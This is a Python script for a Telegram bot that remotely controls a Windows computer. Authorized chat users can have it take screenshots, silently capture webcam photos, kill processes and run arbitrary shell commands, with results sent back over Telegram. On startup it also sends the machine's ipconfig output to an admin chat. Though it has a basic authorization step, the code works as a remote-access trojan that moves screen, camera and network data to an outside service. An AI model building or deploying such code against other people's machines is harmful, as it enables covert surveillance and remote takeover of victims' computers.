import secrets
import pyscreenshot
import json
from subprocess import *
from urllib import request as open_web
import time, datetime
import os
import cv2

admin_chat_id = '' #chat_id of admin in int form
admin_name= "name of admin"

file_found=False
while not file_found:
    try:
        with open('authorzed_Users.json') as f:
            auth_list = json.load(f)
        print(auth_list)
        file_found=True
    except:
        data = {'authorized': [{'chat_id': None, 'Name': None}]}
        with open('authorzed_Users.json', 'w') as f:
            json.dump(data, f, indent=2)

connected = False
while (connected == False):
    try:
        x = open_web.urlopen('https://www.google.com/')
        connected = True
    except:
        connected = False
print(auth_list)
import telepot
from telepot.loop import MessageLoop

random = 1
now = datetime.datetime.now()
authorized = 0
aut_chat_id = 0
pending = 0
logging=False
logger=0

def test_message():
    i = 2
    while (i > 0):
        messag =Popen( 'ipconfig' ,shell=True,stdout=PIPE,text=True).communicate()[0]
     #  print(messag)
        telegram_bot.sendMessage(admin_chat_id ,messag)
        time.sleep(5)
        i = i - 1


def action(msg):
    global auth_list, random, authorized, aut_chat_id, pending,logging,logger
    print(auth_list)

    chat_id = msg['chat']['id']
    command = msg['text']
    first_name = msg['chat']['first_name']
    last_name = msg['chat']['last_name']
    name = f'{first_name} {last_name}'
    print(name)
    print('Received:', command, 'chat_id', chat_id)
    authorized = False
    print(random)
    if pending ==0 or chat_id !=aut_chat_id:
        for i in auth_list['authorized']:
            if i['chat_id'] == chat_id:
                authorized = True
                break
        if authorized:
            list_command=command.split()
            if ((list_command[0]=="screenshot") | (list_command[0]=="Screenshot")):
                print("scr")
                img=pyscreenshot.grab()
                img.save('screen.png')
                telegram_bot.sendPhoto(chat_id,photo=open("screen.png",'rb'))
                os.remove("screen.png")
            elif((list_command[0]=="stop") | (list_command[0]=="Stop")):
                command=f'''Taskkill /f /Im "{list_command[1]}.exe" /t'''
                if len(list_command)==2:
                    message = Popen( command, shell=True, stdout=PIPE, text=True ).communicate()[0]
                else:
                    message='Invalid command'
                telegram_bot.sendMessage(chat_id,message)
            elif((list_command[0]=="photo") | (list_command[0]=="Photo")):
                vod=cv2.VideoCapture(0)
                d,img=vod.read()
                vod.release()
                cv2.imwrite('photo.png',img)
                telegram_bot.sendPhoto(chat_id,photo=open('photo.png','rb'))
                os.remove('photo.png')
            else:
                message = Popen( command ,shell=True,stdout=PIPE,text=True).communicate()[0]
                telegram_bot.sendMessage(chat_id, message)

        else:
            random = str(secrets.token_hex(6))
            print(random,type(random))

            telegram_bot.sendMessage(admin_chat_id , random)
            telegram_bot.sendMessage(admin_chat_id , str('do you want to authorize ' + name))

            telegram_bot.sendMessage(chat_id, f'you are not a authorized user please contact {admin_name}')
            telegram_bot.sendMessage(chat_id, 'He will tell you the authorization code')
            aut_chat_id = chat_id
            pending=1
            print(pending, aut_chat_id)
    else:
        print(random)
        if command == random:
            telegram_bot.sendMessage(chat_id, str('you are authorized ' + name))
            new_guy = {'chat_id': chat_id, 'Name': name}
            print(new_guy)
            auth_list['authorized'].append(new_guy)
            print(auth_list)
            pending=0
            with open('authorzed_Users.json', 'w') as f:
                json.dump(auth_list, f, indent=2)
                f.close()
        else:
            telegram_bot.sendMessage(chat_id, 'sorry invalid code')

telegram_bot = telepot.Bot('auth key from bot father')
test_message()
print(telegram_bot.getMe())#for internal testing

MessageLoop(telegram_bot, action).run_as_thread()

while 1:
    time.sleep(1)
